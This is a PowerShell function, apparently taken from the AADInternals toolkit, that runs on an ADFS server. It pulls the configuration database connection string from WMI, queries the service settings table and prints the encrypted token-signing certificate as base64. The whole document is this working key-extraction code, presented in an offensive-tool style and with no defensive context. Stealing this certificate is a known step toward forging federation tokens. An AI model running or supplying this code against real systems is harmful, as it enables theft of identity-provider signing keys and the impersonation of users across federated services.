# Reference:
# https://www.powershellgallery.com/packages/AADInternals/0.4.4/Content/ADFS_utils.ps1
# 
function Export-ADFSEncryptedSignCert
{
    # Check that we are on ADFS server
    if(!(Get-Service ADFSSRV -ErrorAction SilentlyContinue))
    {
        Write-Error "This command needs to be run on ADFS server"
        return
    }

    # Get the database connection string
    $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
    $conn = $ADFS.ConfigurationDatabaseConnectionString
    Write-Verbose "ConnectionString: $conn"

    # Read the service settings from the database
    $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
    $SQLclient.Open()
    $SQLcmd = $SQLclient.CreateCommand()
    $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"
    $SQLreader = $SQLcmd.ExecuteReader()
    $SQLreader.Read() | Out-Null
    $settings=$SQLreader.GetTextReader(0).ReadToEnd()
    $SQLreader.Dispose()
    Write-Verbose "Settings: $settings"

    # Read the XML, get the encrypted PFX, and save the bytes to a variable
    [xml]$xml=$settings
    $encPfx=$xml.ServiceSettingsData.SecurityTokenService.AdditionalSigningTokens.CertificateReference.EncryptedPfx
    Write-Host "[+] Encrypted Token Signing Certificate (Base64 Encoded)"
    $encPfx | Out-String
}